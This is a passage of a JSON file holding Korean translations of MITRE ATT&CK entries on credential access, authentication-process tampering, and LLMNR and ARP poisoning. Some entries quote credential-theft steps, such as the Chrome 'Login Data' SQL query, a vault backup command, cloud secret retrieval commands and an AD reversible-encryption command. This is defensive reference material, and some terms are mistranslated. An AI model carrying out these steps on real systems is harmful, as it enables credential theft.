사용하기만 하면 됩니다. (출처: OS X Keychain)",
      "external_id": "T1555.002",
      "modified": "2024-10-15T16:41:18.638Z",
      "title": "Securityd Memory",
      "translated": true
    },
    {
      "description": "공격자는 특정 대상 브라우저에 대한 파일을 읽어 웹 브라우저에서 자격 증명을 획득할 수 있습니다. (인용: Talos Olympic Destroyer 2018) 웹 브라우저는 일반적으로 웹사이트의 사용자 이름과 비밀번호와 같은 자격 증명을 저장하여 향후 수동으로 입력할 필요가 없도록 합니다. 웹 브라우저는 일반적으로 자격 증명을 암호화된 형식으로 자격 증명 저장소에 저장하지만, 평문 자격 증명을 웹 브라우저에서 추출하는 방법이 존재합니다.\n\n예를 들어, Windows 시스템에서 Google Chrome의 암호화된 자격 증명은 데이터베이스 파일인 <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code>를 읽고 SQL 쿼리 <code>SELECT action_url, username_value, password_value FROM logins;</code>를 실행하여 얻을 수 있습니다. 그런 다음 암호화된 자격 증명을 Windows API 함수 <code>CryptUnprotectData</code>에 전달하여 평문 비밀번호를 얻을 수 있으며, 이 함수는 피해자의 캐시된 로그인 자격 증명을 복호화 키로 사용합니다. (인용: Microsoft CryptUnprotectData April 2018)\n\n공격자는 FireFox, Safari, Edge와 같은 일반 웹 브라우저에 대해서도 유사한 절차를 실행해 왔습니다. (인용: Proofpoint Vega Credential Stealer May 2018)(인용: FireEye HawkEye Malware July 2017) Windows는 Internet Explorer 및 Microsoft Edge 자격 증명을 [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004)에서 관리하는 자격 증명 잠금장치에 저장합니다.\n\n공격자는 또한 웹 브라우저 프로세스 메모리에서 자격 증명과 일반적으로 일치하는 패턴을 검색하여 자격 증명을 획득할 수 있습니다. (인용: GitHub Mimikittenz July 2016)\n\n웹 브라우저에서 자격 증명을 획득한 후, 공격자는 자격 증명을 다양한 시스템 및/또는 계정에 재사용하려고 시도할 수 있으며, 이로 인해 자격 증명이 특권 계정(예: 도메인 관리자)과 겹치는 경우 공격자의 목표를 상당히 진전시킬 수 있습니다.",
      "external_id": "T1555.003",
      "modified": "2024-08-15T14:13:45.294Z",
      "title": "Credentials from Web Browsers",
      "translated": true
    },
    {
      "description": "적대자는 Windows 자격 증명 관리자에서 자격 증명을 획득할 수 있습니다. 자격 증명 관리자는 NTLM 또는 Kerberos를 통해 인증을 요청하는 웹사이트, 애플리케이션 및/또는 장치에 로그인하기 위한 자격 증명을 Credential Lockers(이전에는 Windows Vaults로 알려짐)에서 저장합니다. (출처: Microsoft Credential Manager store)(출처: Microsoft Credential Locker)\n\nWindows 자격 증명 관리자는 웹사이트 자격 증명과 애플리케이션 또는 네트워크 자격 증명을 두 개의 자격 증명 보관소로 분리합니다. [웹 브라우저로부터의 자격 증명](https://attack.mitre.org/techniques/T1555/003)의 일환으로, Internet Explorer와 Microsoft Edge의 웹사이트 자격 증명은 자격 증명 관리자가 관리하며 웹 자격 증명 보관소에 저장됩니다. 애플리케이션과 네트워크 자격 증명은 Windows 자격 증명 보관소에 저장됩니다.\n\n자격 증명 보관소는 암호화된 `.vcrd` 파일에 자격 증명을 저장하며, 이 파일은 `%Systemdrive%\\Users\\[Username]\\AppData\\Local\\Microsoft\\[Vault/Credentials]` 위치에 있습니다. 암호화 키는 일반적으로 자격 증명과 동일한 폴더에 위치한 <code>Policy.vpol</code>라는 이름의 파일에서 찾을 수 있습니다. (출처: passcape Windows Vault)(출처: Malwarebytes The Windows Vault)\n\n적대자는 여러 메커니즘을 통해 Windows 자격 증명 관리자가 관리하는 자격 증명을 나열할 수 있습니다. <code>vaultcmd.exe</code>는 자격 증명 보관소에 저장된 자격 증명을 명령줄 인터페이스를 통해 열거하는 데 사용할 수 있는 기본 Windows 실행 파일입니다. 적대자는 자격 증명 보관소 내부에 위치한 파일을 직접 읽음으로써 자격 증명을 수집할 수도 있습니다. <code>CredEnumerateA</code>와 같은 Windows API 또한 자격 증명 관리자가 관리하는 자격 증명을 나열하는 데 악용될 수 있습니다. (출처: Microsoft CredEnumerate)(출처: Delpy Mimikatz Credential Manager)\n\n적대자는 자격 증명 백업에서 자격 증명을 얻을 수도 있습니다. 자격 증명 백업 및 복원은 <code>rundll32.exe keymgr.dll KRShowKeyMgr</code>를 실행한 후 \"저장된 사용자 이름 및 비밀번호\" GUI에서 \"백업...\" 버튼을 선택하여 수행할 수 있습니다.\n\n비밀번호 복구 도구 또한 자격 증명 관리자에서 일반 텍스트 비밀번호를 획득할 수 있습니다. (출처: Malwarebytes The Windows Vault)",
      "external_id": "T1555.004",
      "modified": "2024-10-15T16:44:35.906Z",
      "title": "Windows Credential Manager",
      "translated": true
    },
    {
      "description": "공격자는 제3자 비밀번호 관리자로부터 사용자 자격 증명을 획득할 수 있습니다. (인용: ise Password Manager 2019년 2월) 비밀번호 관리자는 일반적으로 암호화된 데이터베이스에 사용자 자격 증명을 저장하도록 설계된 애플리케이션입니다. 자격 증명은 일반적으로 사용자가 데이터베이스를 잠금을 해제하는 마스터 비밀번호를 제공한 후 접근할 수 있습니다. 데이터베이스가 잠금 해제된 후, 이러한 자격 증명을 메모리에 복사할 수 있습니다. 이 데이터베이스는 디스크에 파일로 저장될 수 있습니다. (인용: ise Password Manager 2019년 2월)\n\n공격자는 마스터 비밀번호 및/또는 메모리에서 평문 자격 증명을 추출하여 비밀번호 관리자로부터 사용자 자격 증명을 획득할 수 있습니다. (인용: FoxIT Wocao 2019년 12월)(인용: Github KeeThief) 공격자는 [자격 증명 접근을 위한 악용](https://attack.mitre.org/techniques/T1212)을 통해 메모리에서 자격 증명을 추출할 수 있습니다. (인용: NVD CVE-2019-3610) 공격자는 또한 [비밀번호 추측](https://attack.mitre.org/techniques/T1110/001)을 통해 비밀번호 관리자의 마스터 비밀번호를 얻기 위해 무작위 대입 공격을 시도할 수 있습니다. (인용: Cyberreason Anchor 2019년 12월)",
      "external_id": "T1555.005",
      "modified": "2024-08-19T13:53:33.661Z",
      "title": "Password Managers",
      "translated": true
    },
    {
      "description": "공격자는 AWS Secrets Manager, GCP Secret Manager, Azure Key Vault 및 Terraform Vault와 같은 클라우드 네이티브 비밀 관리 솔루션에서 자격 증명을 획득할 수 있습니다.\n\n비밀 관리자는 비밀번호, API 키 및 기타 자격 증명 자료의 안전한 중앙 집중식 관리를 지원합니다. 비밀 관리자가 사용되는 경우, 클라우드 서비스는 평문 파일이나 환경 변수에 안전하지 않게 저장된 비밀에 접근하는 대신 API 요청을 통해 동적으로 자격 증명을 획득할 수 있습니다.\n\n공격자가 클라우드 환경에서 충분한 권한을 얻는 경우—예를 들어, 높은 권한의 [클라우드 계정](https://attack.mitre.org/techniques/T1078/004) 자격 증명을 획득하거나 비밀을 검색할 권한이 있는 서비스를 손상시키는 경우—비밀 관리자로부터 비밀을 요청할 수 있습니다. 이는 AWS에서 `get-secret-value`, GCP에서 `gcloud secrets describe`, Azure에서 `az key vault secret show`와 같은 명령어를 통해 수행될 수 있습니다. (출처: Permiso Scattered Spider 2023)(출처: Sysdig ScarletEel 2.0 2023)(출처: AWS Secrets Manager)(출처: Google Cloud Secrets)(출처: Microsoft Azure Key Vault)\n\n**참고:** 이 기법은 비밀을 인스턴스 메타데이터 API를 통하지 않고 클라우드 비밀 관리자로부터 직접 요청한다는 점에서 [클라우드 인스턴스 메타데이터 API](https://attack.mitre.org/techniques/T1552/005)와 구별됩니다.",
      "external_id": "T1555.006",
      "modified": "2024-10-15T14:20:16.722Z",
      "title": "Cloud Secrets Management Stores",
      "translated": true
    },
    {
      "description": "적대자는 사용자 자격 증명에 접근하거나 권한이 없는 계정 접근을 가능하게 하기 위해 인증 메커니즘 및 프로세스를 수정할 수 있습니다. 인증 프로세스는 Windows의 로컬 보안 인증 서버(LSASS) 프로세스와 보안 계정 관리자(SAM), Unix 기반 시스템의 플러그형 인증 모듈(PAM), MacOS 시스템의 인증 플러그인 등, 자격 증명을 수집, 저장 및 검증하는 역할을 수행하는 다양한 메커니즘에 의해 처리됩니다. 인증 프로세스를 수정함으로써 적대자는 유효한 계정 없이 서비스나 시스템에 인증할 수 있게 될 수 있습니다.\n\n적대자는 이 프로세스의 일부분을 악의적으로 수정하여 자격 증명을 공개하거나 인증 메커니즘을 우회할 수 있습니다. 손상된 자격 증명이나 접근은 네트워크 내 시스템의 다양한 리소스에 설정된 접근 제어를 우회하는 데 사용될 수 있으며, VPN, Outlook 웹 액세스, 원격 데스크톱과 같은 외부에서 이용 가능한 서비스와 원격 시스템에 대한 지속적인 접근을 위해 사용될 수도 있습니다.",
      "external_id": "T1556",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Modify Authentication Process",
      "translated": true
    },
    {
      "description": "적대적 행위자들은 도메인 컨트롤러의 인증 프로세스를 패치하여 일반적인 인증 메커니즘을 우회하고 계정에 대한 접근을 가능하게 할 수 있습니다.\n\n악성 소프트웨어는 도메인 컨트롤러의 인증 프로세스에 허위 자격 증명을 주입하여 특정 사용자의 계정 및/또는 자격 증명에 접근하기 위해 사용되는 백도어를 생성할 목적으로 사용될 수 있습니다(예: [스켈레톤 키](https://attack.mitre.org/software/S0007)). 스켈레톤 키는 적대적 행위자들이 표준 인증 시스템을 우회하기 위해 사용할 수 있는 자격 증명을 통해 엔터프라이즈 도메인 컨트롤러 인증 프로세스(LSASS)에 대한 패치를 통해 작동합니다. 패치가 이루어지면, 적대적 행위자는 주입된 비밀번호를 사용하여 도메인 사용자 계정으로 성공적으로 인증할 수 있습니다(스켈레톤 키가 도메인 컨트롤러의 메모리에서 제거될 때까지). 인증된 접근은 단일 요소 인증 환경 내에서 호스트 및/또는 리소스에 대한 제한 없는 접근을 가능하게 할 수 있습니다. (출처: Dell Skeleton)",
      "external_id": "T1556.001",
      "modified": "2024-08-21T15:26:54.386Z",
      "title": "Domain Controller Authentication",
      "translated": true
    },
    {
      "description": "공격자는 인증 과정에 악성 비밀번호 필터 동적 링크 라이브러리(DLL)를 등록하여 사용자가 인증될 때 사용자 자격 증명을 획득할 수 있습니다.\n\nWindows 비밀번호 필터는 도메인 및 로컬 계정 모두에 대한 비밀번호 정책 시행 메커니즘입니다. 필터는 잠재적인 비밀번호를 비밀번호 정책과 검증하는 메서드를 포함하는 DLL로 구현됩니다. 필터 DLL은 로컬 계정용 로컬 컴퓨터 및/또는 도메인 계정용 도메인 컨트롤러에 배치될 수 있습니다. 새 비밀번호가 보안 계정 관리자(SAM)에 등록되기 전에 로컬 보안 권한(LKA)은 각 등록된 필터에서 검증을 요청합니다. 모든 잠재적인 변경 사항은 모든 등록된 필터가 검증을 인정해야 적용될 수 있습니다.\n\n공격자는 악성 비밀번호 필터를 등록하여 로컬 컴퓨터 및/또는 전체 도메인에서 자격 증명을 수집할 수 있습니다. 올바른 검증을 수행하려면 필터는 LKA로부터 평문 자격 증명을 받아야 합니다. 악성 비밀번호 필터는 비밀번호 요청이 있을 때마다 이러한 평문 자격 증명을 수신하게 됩니다. (출처: Carnal Ownage Password Filters 2013년 9월)",
      "external_id": "T1556.002",
      "modified": "2024-08-21T16:16:18.271Z",
      "title": "Password Filter DLL",
      "translated": true
    },
    {
      "description": "공격자는 사용자 자격 증명에 접근하거나 정당하지 않은 계정 접근을 가능하게 하기 위해 플러그형 인증 모듈(PAM)을 수정할 수 있습니다. PAM은 다양한 서비스의 인증을 안내하는 구성 파일, 라이브러리, 실행 파일의 모듈식 시스템입니다. 가장 일반적인 인증 모듈은 <code>pam_unix.so</code>로, 이는 <code>/etc/passwd</code>와 <code>/etc/shadow</code>에서 계정 인증 정보를 검색, 설정 및 확인합니다. (출처: Apple PAM)(출처: Man Pam_Unix)(출처: Red Hat PAM)\n\n공격자는 PAM 시스템의 구성 요소를 수정하여 백도어를 생성할 수 있습니다. <code>pam_unix.so</code>와 같은 PAM 구성 요소는 임의의 공격자가 제공한 값을 정당한 자격 증명으로 수용하도록 패치될 수 있습니다. (출처: PAM Backdoor)\n\nPAM 시스템에 대한 악의적인 수정은 자격 증명을 훔치는 데도 악용될 수 있습니다. 공격자는 사용자 자격 증명을 수집하기 위해 PAM 리소스를 코드로 감염시킬 수 있으며, PAM 구성 요소와 교환되는 값은 PAM이 비밀번호를 저장하지 않기 때문에 일반 텍스트일 수 있습니다. (출처: PAM Creds)(출처: Apple PAM)",
      "external_id": "T1556.003",
      "modified": "2024-08-21T16:19:55.082Z",
      "title": "Pluggable Authentication Modules",
      "translated": true
    },
    {
      "description": "상대방은 [패치 시스템 이미지](https://attack.mitre.org/techniques/T1601/001)를 사용하여 운영 체제에 비밀번호를 하드 코딩함으로써 네트워크 장치의 로컬 계정에 대한 기본 인증 메커니즘을 우회할 수 있습니다.\n\n[시스템 이미지 수정](https://attack.mitre.org/techniques/T1601)은 네트워크 장치의 운영 체제에 코드가 심어진 것을 포함할 수 있으며, 이는 특정 비밀번호를 사용하여 상대방이 접근할 수 있도록 합니다. 이 수정은 패치를 통해 운영 체제 이미지에 심어진 특정 비밀번호를 포함합니다. 인증 시도가 있을 때, 삽입된 코드는 먼저 사용자의 입력이 비밀번호인지 확인합니다. 맞다면 접근이 허용됩니다. 그렇지 않다면, 심어진 코드는 유효할 수 있는 자격 증명의 검증을 위해 자격 증명을 전달합니다. (인용: Mandiant - Synful Knock)",
      "external_id": "T1556.004",
      "modified": "2021-12-14T23:14:26.107Z",
      "title": "Network Device Authentication",
      "translated": true
    },
    {
      "description": "적대자는 Active Directory 인증 암호화 속성을 악용하여 Windows 시스템의 자격 증명에 접근할 수 있습니다. `<code>AllowReversiblePasswordEncryption</code>` 속성은 계정에 대한 가역 암호화가 활성화되어 있는지 비활성화되어 있는지를 지정합니다. 기본적으로 이 속성은 비활성화되어 있으며 (사용자 자격 증명을 일방향 해시 함수의 결과로 저장) 레거시 또는 기타 소프트웨어에서 요구하지 않는 한 활성화하지 않아야 합니다. (출처: store_pwd_rev_enc)\n\n이 속성이 활성화되어 있거나 사용자가 비활성화된 상태에서 암호를 변경하면, 적대자는 속성이 활성화된 이후에 생성되거나 변경된 암호의 평문을 얻을 수 있을지 모릅니다. 암호를 복호화하기 위해 적대자는 네 가지 구성 요소가 필요합니다:\n\n1. Active Directory 사용자 구조 `<code>userParameters</code>`에서 암호화된 암호 (`<code>G$RADIUSCHAP</code>`)\n2. `<code>userParameters</code>`에서도 가져온 16바이트 랜덤으로 생성된 값 (`<code>G$RADIUSCHAPKEY</code>`)\n3. 전역 LSA 비밀 (`<code>G$MSRADIUSCHAPKEY</code>`)\n4. 원격 액세스 하위 인증 DLL (`<code>RASSFM.DLL</code>`)에 하드코딩된 정적 키\n\n이 정보를 통해 적대자는 암호화 키를 재생산하고 이후 암호화된 암호 값을 복호화할 수 있습니다. (출처: how_pwd_rev_enc_1)(출처: how_pwd_rev_enc_2)\n\n적대자는 로컬 그룹 정책 편집기, 사용자 속성, 세밀한 비밀번호 정책(FGPP) 또는 ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) 모듈을 통해 이 속성을 다양한 범위에서 설정할 수 있습니다. 예를 들어, 도메인 기능 수준이 \"Windows Server 2008\" 이상으로 설정되어 있으면 적대자는 사용자나 그룹에 FGPP를 구현하고 적용할 수 있습니다. (출처: dump_pwd_dcsync) PowerShell에서 적대자는 `<code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>`와 유사한 명령을 사용하여 사용자 설정에 관련된 변경을 수행할 수 있습니다.",
      "external_id": "T1556.005",
      "modified": "2024-08-26T15:40:31.871Z",
      "title": "Reversible Encryption",
      "translated": true
    },
    {
      "description": "적대자는 다중 인증(MFA) 메커니즘을 비활성화하거나 수정하여 침해된 계정에 대한 지속적인 접근을 허용할 수 있습니다.\n\n적대자가 MFA가 결여된 계정을 침해하거나 [다중 인증 요청 생성](https://attack.mitre.org/techniques/T1621)과 같은 MFA 우회 방법을 사용하여 네트워크에 접근하게 되면, 이들은 자신의 접근 권한을 활용하여 MFA 방어 수단을 수정하거나 완전히 비활성화할 수 있습니다. 이는 Azure AD 조건부 액세스 정책에서 사용자를 제외하거나, 새로운 취약한/적대자 통제 MFA 방법을 등록하거나, 예상되는 기능을 우회하기 위해 MFA 프로그램 및 구성 파일을 수동으로 패치하는 등 정당한 기능을 악용하여 수행할 수 있습니다. (인용: Mandiant APT42) (인용: Azure AD 조건부 액세스 제외)\n\n예를 들어, Windows 호스트 파일(`C:\\windows\\system32\\drivers\\etc\\hosts`)을 수정하여 MFA 호출을 MFA 서버가 아닌 로컬호스트로 리디렉션하면 MFA 프로세스가 실패할 수 있습니다. \"열림 실패\" 정책이 적용된 경우, 성공적인 인증 시도는 MFA를 시행하지 않고 접근을 허용받을 수 있습니다. (인용: Russians Exploit Default MFA Protocol - CISA March 2022)\n\n적대자의 범위, 목표 및 권한에 따라 MFA 방어 수단은 개별 계정에 대해 비활성화되거나, 피해자의 네트워크 환경에 연결된 모든 계정, 예를 들어 모든 도메인 계정에 대해 비활성화될 수 있습니다. (인용: Russians Exploit Default MFA Protocol - CISA March 2022)",
      "external_id": "T1556.006",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Multi-Factor Authentication",
      "translated": true
    },
    {
      "description": "위협 행위자는 온프레미스 사용자 신원과 연계된 클라우드 인증 프로세스를 패치하거나 수정, 또는 백도어를 생성하여 일반적인 인증 메커니즘을 우회하고 자격 증명에 접근하며 계정에 대한 지속적인 접근을 가능하게 할 수 있습니다.\n\n많은 조직은 온프레미스 및 클라우드 기반 환경 간에 공유되는 하이브리드 사용자 및 장치 신원을 유지하고 있습니다. 이러한 신원은 여러 방법으로 유지될 수 있습니다. 예를 들어, Microsoft Entra ID는 Active Directory와 Entra ID 간의 신원을 동기화하기 위한 세 가지 옵션을 포함하고 있습니다(인용: Azure AD Hybrid Identity):\n\n* 비밀번호 해시 동기화(Password Hash Synchronization, PHS): 특권이 있는 온프레미스 계정이 Active Directory와 Entra ID 간의 사용자 비밀번호 해시를 동기화하여 인증이 완전히 클라우드에서 이루어지도록 하는 방식입니다.\n* 통과 인증(Pass Through Authentication, PTA): Entra ID 인증 시도가 온프레미스 PTA 에이전트로 전달되어 Active Directory에 대한 자격 증명을 검증하는 방식입니다.\n* Active Directory 페더레이션 서비스(Active Directory Federation Services, AD FS): Active Directory와 Entra ID 간에 신뢰 관계를 수립하는 방식입니다.\n\nAD FS는 AWS 및 GCP와 같은 기타 SaaS 및 클라우드 플랫폼과도 함께 사용할 수 있으며, 이들 플랫폼은 인증 프로세스를 AD FS에 넘겨주고 하이브리드 사용자의 신원 및 권한이 포함된 토큰을 수신합니다.\n\n하이브리드 신원에 연계된 인증 프로세스를 수정함으로써, 위협 행위자는 클라우드 리소스에 대한 지속적인 특권 접근을 수립할 수 있습니다. 예를 들어, PTA 에이전트가 실행 중인 온프레미스 서버를 침해한 위협 행위자는 `AzureADConnectAuthenticationAgentService` 프로세스에 악성 DLL을 주입하여 Entra ID에 대한 모든 인증 시도를 승인하도록 하고 사용자 자격 증명을 기록할 수 있습니다(인용: Azure AD Connect for Red Teamers)(인용: AADInternals Azure AD On-Prem to Cloud). AD FS를 사용하는 환경에서는, 위협 행위자가 `Microsoft.IdentityServer.Servicehost` 구성 파일을 수정하여 악성 DLL을 로드하여 어떤 주장을 가진 사용자에 대해서도 인증 토큰을 생성하도록 함으로써 다단계 인증 및 정의된 AD FS 정책을 우회할 수 있습니다(인용: MagicWeb).\n\n일부 경우에서는 위협 행위자가 클라우드에서 하이브리드 신원 인증 프로세스를 수정할 수 있습니다. 예를 들어, Entra ID 테넌트에서 글로벌 관리자 계정을 침해한 위협 행위자는 웹 콘솔을 통해 새로운 PTA 에이전트를 등록할 수 있으며, 이를 통해 자격 증명을 수집하고 모든 사용자로 Entra ID 환경에 로그인할 수 있게 됩니다(인용: Mandiant Azure AD Backdoors).",
      "external_id": "T1556.007",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Hybrid Identity",
      "translated": true
    },
    {
      "description": "적대 세력은 인증 과정에서 평문 사용자 자격 증명을 캡처하기 위해 악성 네트워크 공급자 동적 링크 라이브러리(DLL)를 등록할 수 있습니다. 네트워크 공급자 DLL은 Windows가 특정 네트워크 프로토콜과 상호 작용할 수 있게 해주며, 추가적인 자격 증명 관리 기능을 지원할 수도 있습니다.(출처: Network Provider API) 로그온 과정 동안, Winlogon(상호 작용 로그온 모듈)은 로컬 `mpnotify.exe` 프로세스에 RPC를 통해 자격 증명을 전송합니다. 그 후 `mpnotify.exe` 프로세스는 로그온 이벤트가 발생하고 있음을 알릴 때 등록된 자격 증명 관리자와 평문으로 자격 증명을 공유합니다.(출처: NPPSPY - Huntress)(출처: NPPSPY 비디오)(출처: NPLogonNotify)\n\n적대 세력은 `mpnotify.exe`로부터 자격 증명을 수신하도록 악성 네트워크 공급자 DLL을 구성할 수 있습니다.(출처: NPPSPY) 자격 증명 관리자로서 설치된 악성 DLL은 사용자가 Windows 작업station이나 도메인에 로그인할 때마다 `NPLogonNotify()` 함수를 통해 자격 증명을 수신하고 저장할 수 있습니다.(출처: NPLogonNotify)\n\n적대 세력은 로그온 활동이 증가한 시스템이나 관리자 로그온 활동이 있는 시스템, 예를 들어 서버 및 도메인 컨트롤러 등에 악성 네트워크 공급자 DLL을 심으려 할 수 있습니다.(출처: NPPSPY - Huntress)",
      "external_id": "T1556.008",
      "modified": "2023-05-04T18:02:51.318Z",
      "title": "Network Provider DLL",
      "translated": true
    },
    {
      "description": "공격자는 손상된 계정에 대한 지속적인 접근을 가능하게 하기 위해 조건부 접근 정책을 비활성화하거나 수정할 수 있습니다. 조건부 접근 정책은 사용자에게 리소스에 대한 접근을 허용해야 하는지를 결정하기 위해 아이덴티티 제공자 및 아이덴티티 및 접근 관리 시스템에서 사용하는 추가 검증 수단입니다.\n\n예를 들어, Entra ID, Okta 및 JumpCloud에서는 사용자에게 IP 주소, 장치 등록 상태 및 다중 인증(Multi-Factor Authentication)의 사용 여부에 따라 애플리케이션 접근을 거부할 수 있습니다. 일부 경우, 아이덴티티 제공자는 다양한 지표에 기반하여 로그인 거부를 지원하는 위험 기반 메트릭을 사용하기도 합니다. AWS 및 GCP에서는 IAM 정책에 `condition` 속성이 포함되어 임의의 제약 조건(예: 원본 IP, 요청이 이루어진 날짜, 요청된 리소스 또는 지역의 성격)을 검증할 수 있습니다. 이러한 조치는 손상된 자격 증명이 데이터 또는 리소스에 대한 무단 접근으로 이어지는 것을 방지하고 사용자의 권한을 최소한으로 제한하는 데 도움을 줍니다.\n\n공격자는 조건부 접근 정책을 수정하여 추가 신뢰된 IP 범위를 추가하거나 다중 인증 요구 사항을 제거하거나 추가적인 사용되지 않거나 지원되지 않는 클라우드 지역을 허용함으로써 계정에 대한 지속적인 접근을 보장하고 방어 수단을 우회할 수 있습니다.",
      "external_id": "T1556.009",
      "modified": "2024-09-16T16:54:47.595Z",
      "title": "Conditional Access Policies",
      "translated": true
    },
    {
      "description": "적대자는 후속 행동을 지원하기 위해 두 개 이상의 네트워크 장치 사이에 위치하려고 시도할 수 있으며, 이를 위해 적대자 중간자(AiTM) 기법을 사용할 수 있습니다. 이러한 행동에는 [네트워크 스니핑](https://attack.mitre.org/techniques/T1040), [전송 데이터 조작](https://attack.mitre.org/techniques/T1565/002) 또는 재전송 공격([자격 증명 접근을 위한 악용](https://attack.mitre.org/techniques/T1212))이 포함될 수 있습니다. 적대자는 네트워크 트래픽 흐름을 결정할 수 있는 일반적인 네트워킹 프로토콜의 기능을 악용하여(예: ARP, DNS, LLMNR 등) 특정 장치가 적대자가 제어하는 시스템을 통해 통신하도록 강제로 유도하여 정보를 수집하거나 추가적인 작업을 수행할 수 있습니다. (인용: Rapid7 MiTM Basics)\n\n예를 들어, 적대자는 피해자의 DNS 설정을 조작하여 사용자가 합법적인 사이트에 접근하지 못하도록 하거나 추가적인 맬웨어를 유포하는 등의 악의적인 활동을 가능하게 할 수 있습니다. (인용: ttint_rat)(인용: dns_changer_trojans)(인용: ad_blocker_with_miner) 적대자는 DNS를 조작하고 자신의 위치를 활용하여 사용자 자격 증명, 즉 접근 토큰([애플리케이션 접근 토큰 탈취](https://attack.mitre.org/techniques/T1528)) 및 세션 쿠키([웹 세션 쿠키 탈취](https://attack.mitre.org/techniques/T1539))를 가로챌 수도 있습니다. (인용: volexity_0day_sophos_FW)(인용: Token tactics) [다운그레이드 공격](https://attack.mitre.org/techniques/T1562/010) 또한 무역소통 프로토콜(SSL/TLS)이나 암호화 알고리즘의 덜 안전하고 구식 혹은 약한 버전을 협상하여 AiTM 위치를 설정하는 데 사용될 수 있습니다. (인용: mitm_tls_downgrade_att)(인용: taxonomy_downgrade_att_tls)(인용: tlseminar_downgrade_att)\n\n적대자는 AiTM 위치를 활용하여 트래픽을 모니터링 및/또는 수정하려고 시도할 수 있으며, 예를 들어 [전송 데이터 조작](https://attack.mitre.org/techniques/T1565/002)과 같은 방식입니다. 적대자는 AiTM와 유사한 위치를 설정하여 트래픽이 적절한 목적지로 흐르지 못하도록 방해할 수 있으며, 이는 [방어력 약화](https://attack.mitre.org/techniques/T1562) 및/또는 [네트워크 서비스 거부 공격](https://attack.mitre.org/techniques/T1498)을 지원하는 데 활용될 수 있습니다.",
      "external_id": "T1557",
      "modified": "2024-04-18T14:26:21.852Z",
      "title": "Adversary-in-the-Middle",
      "translated": true
    },
    {
      "description": "LLMNR/NBT-NS 네트워크 트래픽에 응답함으로써, 공격자는 권한 있는 이름 해석 출처를 스푸핑하여 공격자가 제어하는 시스템과의 통신을 강제할 수 있습니다. 이 활동은 인증 정보 수집 또는 중계에 사용될 수 있습니다.\n\nLink-Local Multicast Name Resolution (LLMNR)와 NetBIOS Name Service (NBT-NS)는 Microsoft Windows 구성 요소로, 호스트 식별을 위한 대체 방법으로 작용합니다. LLMNR은 도메인 이름 시스템(DNS) 형식을 기반으로 하며, 동일한 로컬 링크의 호스트들이 다른 호스트에 대한 이름 해석을 수행할 수 있게 합니다. NBT-NS는 로컬 네트워크의 시스템을 NetBIOS 이름으로 식별합니다. (출처: Wikipedia LLMNR)(출처: TechNet NetBIOS)\n\n공격자는 피해 네트워크에서 LLMNR (UDP 5355)/NBT-NS (UDP 137) 트래픽에 응답하여 요청된 호스트의 신원을 알고 있는 것처럼 권한 있는 이름 해석 출처를 스푸핑할 수 있으며, 이는 서비스에 독성을 주어 피해자가 공격자가 제어하는 시스템과 통신하도록 만듭니다. 요청된 호스트가 식별/ 인증을 요구하는 리소스에 속하는 경우, 사용자 이름과 NTLMv2 해시가 공격자가 제어하는 시스템으로 전송됩니다. 그런 다음 공격자는 트래픽을 감시하는 도구를 통해 전송된 해시 정보를 수집하거나 [네트워크 스니핑](https://attack.mitre.org/techniques/T1040)을 통해 해시를 오프라인에서 [브루트 포스](https://attack.mitre.org/techniques/T1110)를 사용하여 평문 비밀번호를 얻습니다.\n\n어떤 경우에는 공격자가 시스템 간 인증 경로에 있는 시스템에 접근하거나, 자동화된 스캔이 인증 정보를 사용해 공격자가 제어하는 시스템에 인증을 시도하는 경우, NTLMv1/v2 해시가 인터셉트되어 중계되어 목표 시스템에 대한 코드 접근 및 실행이 가능합니다. 중계 단계는 독성을 주는 과정과 함께 발생할 수 있지만, 독성과는 독립적으로 발생할 수도 있습니다. (출처: byt3bl33d3r NTLM 중계)(출처: Secure Ideas SMB Relay) 또한, 공격자는 NTLMv1/v2 해시를 LDAP, SMB, MSSQL 및 HTTP와 같은 다양한 프로토콜로 캡슐화하여 유효한 NTLM 응답으로 여러 서비스를 확장하고 활용할 수 있습니다.\n\n로컬 네트워크 내에서 이름 서비스를 독성 주기 위해 여러 도구가 사용될 수 있으며, 예를 들어 NBNSpoof, Metasploit, [Responder](https://attack.mitre.org/software/S0174) 등이 있습니다. (출처: GitHub NBNSpoof)(출처: Rapid7 LLMNR Spoofer)(출처: GitHub Responder)",
      "external_id": "T1557.001",
      "modified": "2022-10-25T15:46:55.393Z",
      "title": "LLMNR/NBT-NS Poisoning and SMB Relay",
      "translated": true
    },
    {
      "description": "적대 세력은 주소 해결 프로토콜(ARP) 캐시를 오염시켜 두 개 이상의 네트워크 장치 간의 통신 사이에 자신을 위치시킬 수 있습니다. 이 활동은 [네트워크 스니핑](https://attack.mitre.org/techniques/T1040) 또는 [전송된 데이터 조작](https://attack.mitre.org/techniques/T1565/002)과 같은 후속 행동을 가능하게 하는 데 사용될 수 있습니다.\n\nARP 프로토콜은 IPv4 주소를 링크 계층 주소, 즉 미디어 접근 제어(MAC) 주소로 변환하는 데 사용됩니다.(참조: RFC826 ARP) 로컬 네트워크 세그먼트의 장치들은 링크 계층 주소를 이용하여 서로 통신합니다. 만약 네트워크 장치가 특정 네트워크 장치의 링크 계층 주소를 모를 경우, 해당 IP 주소를 MAC 주소로 변환하기 위해 로컬 네트워크에 브로드캐스트 ARP 요청을 보낼 수 있습니다. 연관된 IP 주소를 가진 장치는 그에 대한 MAC 주소를 직접 회신합니다. ARP 요청을 보낸 네트워크 장치는 그 정보를 사용하고 ARP 캐시에 저장합니다.\n\n적대 세력은 ARP 요청이 들어오는 것을 수동적으로 기다리다가 요청 장치의 ARP 캐시를 오염시킬 수 있습니다. 적대 세력은 자신의 MAC 주소로 응답하여 희생자가 의도한 네트워크 장치와 통신하고 있다고 믿게 만듭니다. ARP 캐시를 오염시키기 위해서는 적대 세력의 응답이 합법적인 IP 주소 소유자의 응답보다 빨라야 합니다. 적대 세력은 또한 불법적으로 특정 IP 주소의 소유권을 로컬 네트워크 세그먼트의 모든 장치에 발표하는 비상 전송 ARP 응답을 보낼 수 있습니다.\n\nARP 프로토콜은 상태 비저장(stateless)이며 인증을 요구하지 않습니다. 따라서 장치들은 ARP 캐시에서 IP 주소에 대한 MAC 주소를 잘못 추가하거나 업데이트할 수 